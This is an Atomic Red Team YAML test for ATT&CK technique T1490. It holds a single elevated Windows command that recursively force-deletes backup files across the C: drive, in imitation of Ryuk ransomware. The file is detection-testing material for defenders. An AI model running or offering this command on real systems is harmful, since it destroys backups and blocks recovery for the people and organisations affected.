# case11

Source: an Atomic Red Team test (YAML).

<!-- Atomic Red Team test (https://github.com/redcanaryco/atomic-red-team), MIT License, Red Canary. -->

---

attack_technique: T1490
display_name: Inhibit System Recovery
name: Windows - Delete Backup Files
auto_generated_guid: 6b1dbaf6-cc8a-4ea6-891f-6058569653bf
description: |
  Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
  to delete files from around the system.
supported_platforms:
- windows
executor:
  command: |
    del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
  name: command_prompt
  elevation_required: true

